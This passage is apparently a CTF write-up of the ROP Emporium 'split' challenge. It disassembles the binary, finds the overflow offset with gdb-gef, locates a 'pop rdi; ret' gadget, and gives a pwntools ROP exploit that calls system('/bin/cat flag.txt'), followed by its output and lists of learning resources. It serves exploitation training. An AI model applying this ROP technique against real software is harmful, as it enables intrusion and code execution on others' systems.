0x00400041    1 7            fcn.00400041
0x00400048    1 164          fcn.00400048
0x004005a0    3 26           sym._init
0x004005d0    1 6            sym.imp.puts
0x004005e0    1 6            sym.imp.system
0x004005f0    1 6            sym.imp.printf
0x00400600    1 6            sym.imp.memset
0x00400610    1 6            sym.imp.__libc_start_main
0x00400620    1 6            sym.imp.fgets
0x00400630    1 6            sym.imp.setvbuf
0x00400640    1 6            sub.__gmon_start___248_640
0x00400650    1 41           entry0
0x00400680    4 50   -> 41   sym.deregister_tm_clones
0x004006c0    3 53           sym.register_tm_clones
0x00400700    3 28           sym.__do_global_dtors_aux
0x00400720    4 38   -> 35   entry1.init
0x00400746    1 111          sym.main
0x004007b5    1 82           sym.pwnme
0x00400807    1 17           sym.usefulFunction
0x00400820    4 101          sym.__libc_csu_init
0x00400890    1 2            sym.__libc_csu_fini
0x00400894    1 9            sym._fini
[0x00400650]> pdf @sym.pwnme
/ (fcn) sym.pwnme 82
|   sym.pwnme ();
|           ; var int local_20h @ rbp-0x20
|              ; CALL XREF from 0x0040079f (sym.main)
|           0x004007b5      55             push rbp
|           0x004007b6      4889e5         mov rbp, rsp
|           0x004007b9      4883ec20       sub rsp, 0x20
|           0x004007bd      488d45e0       lea rax, qword [local_20h]
|           0x004007c1      ba20000000     mov edx, 0x20               ; 32 ; size_t n
|           0x004007c6      be00000000     mov esi, 0                  ; int c
|           0x004007cb      4889c7         mov rdi, rax                ; void *s
|           0x004007ce      e82dfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x004007d3      bfd0084000     mov edi, str.Contriving_a_reason_to_ask_user_for_data... ; 0x4008d0 ; "Contriving a reason to ask user for data..." ; const char * s
|           0x004007d8      e8f3fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007dd      bffc084000     mov edi, 0x4008fc           ; const char * format
|           0x004007e2      b800000000     mov eax, 0
|           0x004007e7      e804feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x004007ec      488b159d0820.  mov rdx, qword [obj.stdin]  ; [0x601090:8]=0 ; FILE *stream
|           0x004007f3      488d45e0       lea rax, qword [local_20h]
|           0x004007f7      be60000000     mov esi, 0x60               ; '`' ; 96 ; int size
|           0x004007fc      4889c7         mov rdi, rax                ; char *s
|           0x004007ff      e81cfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400804      90             nop
|           0x00400805      c9             leave
\           0x00400806      c3             ret
[0x00400650]> pdf @sym.usefulFunction
/ (fcn) sym.usefulFunction 17
|   sym.usefulFunction ();
|           0x00400807      55             push rbp
|           0x00400808      4889e5         mov rbp, rsp
|           0x0040080b      bfff084000     mov edi, str.bin_ls         ; 0x4008ff ; "/bin/ls" ; const char * string
|           0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
|           0x00400815      90             nop
|           0x00400816      5d             pop rbp
\           0x00400817      c3             ret
[0x00400650]> izzq~sh
0x11 10 9 .shstrtab
0x44 10 9 .gnu.hash
[0x00400650]> izzq~cat
0x601060 18 17 /bin/cat flag.txt
[0x00400650]> 
```

>izzq~<str> is used to find the address of a specific string in that ELF.

As this is X86-64 bit binary, according to calling convention of x86-64 the arguments provided into the function as parameter is stored in register. The first argument is stored in `rdi`, I'd recommend reading on calling convention.

So, let's find the buffer offset, shall we?

```r
robin@oracle:~/ROP-Emporium$ gdb-gef -q split
Reading symbols from split...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 1 command could not be loaded, run `gef missing` to know why.
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/robin/ROP-Emporium/split 
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.


-- snip --


──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "split", stopped, reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400806 → pwnme()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400806 in pwnme ()
gef➤  pattern search faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala
[+] Searching 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala'
[+] Found at offset 40 (big-endian search) 
gef➤  
```
Ah, easier than manual find.

So, let's find a gadget as we already know that `/bin/cat flag.txt` and the symbol `system` is present let's find the `pop rdi; ret;` so the string would be provided to system for execution.
Ropper to the rescue:-

```s
robin@oracle:~/ROP-Emporium$ ropper --file split --search 'pop rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x0000000000400883: pop rdi; ret; 
```

Now, our payload would be `padding + pop_rdi + bin_cat + system`, breaking it down:-

First `padding` offset to the stack pointer, now the gadget `pop rdi; ret;` as the `/bin/cat flag.txt` will be stored in rdi register we will just provide the `system` address and we are done.

Let's craft the exploit:-

```python
from pwn import *

p = process("./split")

payload = "A"*40  # padding 
payload += p64(0x400883) # pop_rdi
payload += p64(0x601060) # /bin/cat flag.txt
payload += p64(0x400810) # system

p.recvuntil(">") # This will recieve wait we reach this
p.sendline(payload) # Sending the payload afterwards as input
p.interactive()
```

```s
robin@oracle:~/ROP-Emporium$ echo "We got it" > flag.txt
robin@oracle:~/ROP-Emporium$ python split_exploit.py 
[+] Starting local process './split': pid 12495
[*] Switching to interactive mode
 We got it
[*] Got EOF while reading in interactive
$ 
[*] Process './split' stopped with exit code -11 (SIGSEGV) (pid 12495)
[*] Got EOF while sending in interactive
robin@oracle:~/ROP-Emporium$ 
```

Poof, we got it.

# Format String

Coming soon


# References:-


### Blogs:-

* <https://syedfarazabrar.com/>
* <https://kileak.github.io>
* <https://d4mianwayne.github.io/>
* <https://ctf101.org/binary-exploitation/buffer-overflow/>
* <https://blog.skullsecurity.org/category/ctfs>

### Youtube:-

* <https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos>
* <https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN>

### Wargames:-

* <http://pwnable.kr/>
* <http://pwnable.tw/>
* <http://pwn.eonew.cn/user/login.php>
* <https://www.root-me.org/?lang=en>
* <http://smashthestack.org/>
* <https://exploit.education/>


### Pwn Related Stuffs:-

* PwnTips - <https://github.com/Naetw/CTF-pwn-tips>
* Quick guide -<https://trailofbits.github.io/ctf/exploits/binary1.html>
* Pwn Challenge List - <https://pastebin.com/uyifxgPu>